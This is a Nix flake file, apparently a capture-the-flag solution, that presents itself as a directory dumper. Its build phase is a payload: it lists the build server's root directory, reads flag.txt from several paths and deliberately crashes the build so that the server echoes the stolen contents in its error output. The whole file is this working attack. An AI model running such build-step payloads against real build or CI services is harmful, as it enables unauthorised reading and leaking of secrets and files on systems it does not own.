{
  description = "Directory tree and file content dumper";

  # 1. Define where to get nixpkgs
  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }: 
  let
    # 2. Instantiate the packages for the target system
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "dump-tree";
      version = "1.0";

      # 3. Give it a valid source (the flake directory itself)
      src = ./.;

      # 4. Put your payload in the buildPhase and redirect to stderr
      buildPhase = ''
        echo "=== BEGIN DIRECTORY TREE DUMP ===" >&2
        
        # Searching the root directory might be noisy, but let's look around
        ls -la / >&2
        
        echo "=== FLAG CONTENTS START ===" >&2
        cat ../../flag.txt >&2 || echo "flag.txt not in ../../" >&2
        cat /flag.txt >&2 || echo "flag.txt not in /" >&2
        cat ../flag.txt >&2 || echo "flag.txt not in ../" >&2
        echo "=== FLAG CONTENTS END ===" >&2
        
        # 5. INTENTIONALLY CRASH THE BUILD
        # This ensures the build server prints our stderr log to the screen
        exit 1
      '';

      installPhase = "mkdir -p $out";
    };
  };
}
